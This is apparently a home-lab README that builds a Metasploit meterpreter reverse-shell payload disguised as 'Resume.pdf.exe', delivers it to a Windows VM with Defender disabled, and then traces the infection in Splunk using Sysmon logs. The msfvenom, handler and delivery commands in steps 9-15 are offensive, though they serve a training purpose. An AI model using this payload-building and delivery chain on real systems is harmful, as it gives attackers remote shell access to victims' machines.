# Home Lab-Malware Analysis

## Objective

To develop a controlled home lab environment for malware analysis, detection, and understanding of malicious software to enhance cybersecurity skills and knowledge.

### Skills Learned
<!--[Bullet Points - Remove this afterwards]-->

- Advanced understanding of Securing VMs to analyze malware and tools in a secure sandbox enviroment.
-  Developed skills in generating telemtry and analyze system events.
- Proficiency in analyzing and interpreting network logs.
- Development of critical thinking and problem-solving skills in cybersecurity.
<!-- - Ability to generate and recognize attack signatures and patterns.-->
<!-- -Enhanced knowledge of network protocols and security vulnerabilities.-->

### Tools Used
[Bullet Points - Remove this afterwards]

- Splunk: Utilized Splunk for real-time data indexing, search, and visualization, create indexes and detection of system activity and analyze security events.
- Sysmon (System Monitor): Implemented Sysmon to capture detailed system activity and integrated it with splunk, enhancing visibility into potential security incidents and system anomalies.
- Nmap: Leveraged Nmap for network scanning and enumeration, identifying open ports, services, and potential vulnerabilities to assess the security posture of systems and networks.

## Steps
<!--drag & drop screenshots here or use imgur and reference them using imgsrc-->

<!--Every screenshot should have some text explaining what the screenshot is about.-->

1. Download a hypervisor of your choice. I used <a href="https://www.virtualbox.org/"/>Virtualbox</a>.
2. Next get your ISO's for OS's of your choice. I used <a href="https://www.kali.org"/>Kali</a>, for my attacking machine. And standard <a href="https://www.microsoft.com/en-us/software-download/windows10"/>Windows 10</a>
   ![Kali VM summary](https://github.com/user-attachments/assets/89953f96-f072-48fd-ac60-7565f8dc3081)<br> *Ref1: Kali VM Summary* <br>
   ![Windows 10 VM summary](https://github.com/user-attachments/assets/3099cc02-718e-4a3a-9234-a8f20fb3a05e)<br> *Ref2: Win 10 VM Summary* <br>
3. Setting up Networking for communications on our VMs.<br>
  3a. To setup a network option for testing tools: Under the network tab in virtualbox on one of your VMs, under apdater 1, in the drop down menu (it says "Attached to:") select NAT (chosen as default) and donload your tools.
    ![selecting NAT VM](https://github.com/user-attachments/assets/98fbb78c-685c-458b-92fa-74eae93d5cd7) <br> *Ref3: Selecting NAT* <br>
  3b. To setup a network option for Malware Analysis: In the same "Attached to:" drop down select Internal Network and enter a name for that network. Make sure both machines are selected for the same network<br>
     ![Internal Network for VM](https://github.com/user-attachments/assets/fdc0797d-3fdb-4dda-a102-a632405aa171) <br> *Ref4: Selecting Internal Network* <br>
4. On the Windows 10 machine, right-click the globe icon and navigate to network and internet settings. From there click on change adapter options and right click on Ethernet and click properties. From there locate "Internet Protocol version 4(TCP/IP)" and click the     
   properties button. Select "Use the following IP address:" and enter the IP address you want with a Subnet Mask of /24 (255.255.255.0). You can use ipconfig in the command prompt to check your IP afterwards.<br>
   ![Win 10 VM IP adress](https://github.com/user-attachments/assets/b5480247-7417-4443-91b9-dda27d062d56)<br> *Ref5: Win 10 IP address* <br>
5. On your Kali machine, right-click the ethernet icon at the top right corner and click "Edit Connections...".<br>
   ![Kali edit connections](https://github.com/user-attachments/assets/17a17174-3dd2-4b76-93d2-135a53f654ac)<br> *Ref6: Kali Edit Connection* <br>
6. Select "Wired connection" and click the gear icon. Select "IPv4 Settings". Change the "Method" to manual. Beside the "Addresses" box click "Add" button. Enter your desired IP address and type in 24 for your netmask. Click save<br>
   ![Kali VM IP address](https://github.com/user-attachments/assets/d2689a76-0e44-4f74-be6e-39ac6c1b90e4)<br> *Ref7: Kali VM IP address* <br>
7. Right-click anywhere on the screen to open Terminal. Run ipconfig to make sure your IP address is what you put. Go back to your windows machine and ping your kali machine to test connection*Windows blocks ICMP traffic by default). Take a snapshot on both machines
8. On your Kali machine open the terminal and type "nmap -A and the target IP address (Win 10 machine) -Pn" so it can scan everything.<br>
 ![Kali VM nmap](https://github.com/user-attachments/assets/9e089326-0f61-4d4b-8171-6f5dfee838d8)<br> *Ref8: Kali Nmap* <br>
9. I used msfvenom from metasploit to create a basic malware. msfvenom -l payloads to get a list of payloads.<br>
    ![msfvenom payloads](https://github.com/user-attachments/assets/588ebf29-7a20-4df4-9098-e7614bf70979)<br> *Ref9: msfvenom payloads* <br>
    I chose windows/x64/meterpreter_reverse_tcp
10. Next I continued making the malwater with msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=(Kali/attacker machine IP) lport=4444 -f exe -o Resume.pdf.exe <br>
   ![create kali payload](https://github.com/user-attachments/assets/a029eb29-6de8-46c5-92da-d5dcf3626be4)<br> *Ref10: Creating Kali payload* <br>
11. Next I opened up metasploit with msfconsole. Then typed "use exploit/multi/handler" to open the handler. Because when i typed in options the payload was not set to the payload i configured in msf venom, I set it with "set payload windows/x64/meterpreter/reverse_tcp".<br>
   ![Kali metasploit payload set](https://github.com/user-attachments/assets/16574afe-dd97-4a3e-8617-bb42fd62e9cf)<br> *Ref11: Set metasploit payload* <br>
12. Change the lhost to the Kali/attacker machine IP address.<br>
   ![Set lhost IP](https://github.com/user-attachments/assets/319db9d2-0379-44d0-932d-b301692eb723)<br> *Ref12: Set lhost IP* <br>
13. Type in "exploit" to start listening in on the handler.
14. Use a new tab to start a server for the windows machine to download our malware: "pyhton3 -m http.server 9999"
15. On the windows machine diable windows defender under real-time protection. Then on a web brower connect to the kali machine ip address. Download the created malware, double click it and run it. In command prompt type "netstat -anob" to check for an established connection. Go back to kali machine and start a shell with "shell" and type in "net user", "net localgroup", and "ipconfig" to test that you have opened a shell on your test machine.
16.  On the Windows 10 machine before we can gather any telemetry make sure that splunk is set to ingest sysmon data, in splunk/etc/system/local folder see if there is an inputs.conf file with a line saying<br> "[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = endpoint
disabled = false
renderXml = true
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"<br>
17. Open Splunk, select settings and click indexes. Click on "New Index" and name it endpoint, hit save. Male sure there is an entry for enpoint and its enabled.<br>
   ![Splunk index verification](https://github.com/user-attachments/assets/51937c4b-36af-4268-b216-b32b0a9c6475)<br> *Ref13: Verifying Splunk Index* <br>
Also make sure to go to Apps > Find More Apps and search sysmon for the sysmon add-on
18. Go to "Search & Reporting", in the search bar type in "index=endpoint:.<br>
   ![splunk index=endpoint](https://github.com/user-attachments/assets/0a6d1876-fe75-426f-b4b1-e75f5eff5e52)<br> *Ref14: Index=endpoint* <br>
19. Query the Kali machine with "index=endpoint 192.168.1.75"<br>
   ![Splunk Kali query](https://github.com/user-attachments/assets/71c2ccf6-6823-4a85-ba44-dc916fa022d9)<br> *Ref15: Kali Query* <br>
20. Find dest_port to see that something is connecting to our 4444 port. Is this machine something that should be attempting to connect to our 4444 port? What machine is this? Who does it belong to?<br>
   ![Splunk dest_port](https://github.com/user-attachments/assets/53e2a651-fe01-4d8e-904d-a6dd1c6c4f55)<br> *Ref16: Dest Port* <br>
21. Checking what out malware looks like. Query "index=endpoint Resume.pdf.exe"<br>
   ![Splunk malware query](https://github.com/user-attachments/assets/a3ee897b-0258-44b5-851b-909363deda1d)<br> *Ref17: Malware Query* <br>
take note of how many events (upper left under search bar).
22. Scroll down and take note of "EventCode" count. ![Splunk EventCode](https://github.com/user-attachments/assets/3d037a58-24cd-4f7f-881d-ed1f79978798)<br> *Ref18: EventCode* <br>
23. Query event code 1 by either clicking on it or typing "index=endpoint Resume.pdf.exe EventCode=1". Click on the arrow button to expand the event. The ParentImage field executed our malware. ![Splunk ParentImage](https://github.com/user-attachments/assets/c174b3f5-7eb9-4f11-ac68-ee3751657f61)*Ref19: ParentImage* <br>
This parent process has spawned the process cmd.exe<br>![Splunk process](https://github.com/user-attachments/assets/a1c152c1-f840-4eda-927d-0bf34633dc8f) *Ref20: Parent_process* <br>
With the same process look up the processId and use it to query the data and see what this command prompt had done. 
24. Use the process_guid ![Splunk process_guid](https://github.com/user-attachments/assets/50116df9-d336-4d3f-a01d-a5e5000c5f5a) *Ref21: process_guid* <br>
query the process_guid and clean up the results with "table _time,ParentImage,Image,CommandLine"<br>
![Splunk process_guid query](https://github.com/user-attachments/assets/385e3fb9-b07c-47c9-8ff0-c13dca64fda5)<br> *Ref22: Process_guid query* <br>
25. Now you can easily see that our malware ran cmd.exe and command line commands ran on the test machine.<br>
![Splunk Malware Analysis ran cmd](https://github.com/user-attachments/assets/92e1be3b-42eb-451d-a1cf-aea043cf1046)<br> *Ref23: Malware ran cmd.exe* <br>

Now I can start creating detections so the appropriate people are alerted the next time a similar activity occurs.
